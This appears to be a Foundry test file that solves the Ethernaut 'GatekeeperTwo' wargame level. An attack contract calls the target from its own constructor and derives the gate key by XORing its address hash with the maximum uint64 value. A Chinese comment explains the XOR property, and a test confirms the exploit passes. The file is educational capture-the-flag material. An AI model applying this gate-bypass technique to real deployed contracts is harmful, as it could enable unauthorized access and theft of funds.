// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.17;

import {Test, console} from "forge-std/Test.sol";
import {GatekeeperTwo} from "../src/GatekeeperTwo.sol";

/*  
异或运算有趣的一点是，你把结果和任意一个输入变量再做异或运算， 就可以得到另一个输入变量
*/

contract GatekeeperTwoAttack {
    constructor(address _target) {
        GatekeeperTwo target = GatekeeperTwo(_target);
        bytes8 _gateKey = bytes8(uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ type(uint64).max);
        target.enter(_gateKey);
    }
}

contract GatekeeperTwoTest is Test {
    GatekeeperTwo public gt2;
    GatekeeperTwoAttack gtAttack;

    address alice = makeAddr("alice");

    function setUp() public {
        gt2 = new GatekeeperTwo();
    }

    function testAttack() public {
        vm.prank(alice, alice);
        gtAttack = new GatekeeperTwoAttack(address(gt2));

        assertEq(gt2.entrant(), alice);
    }
}
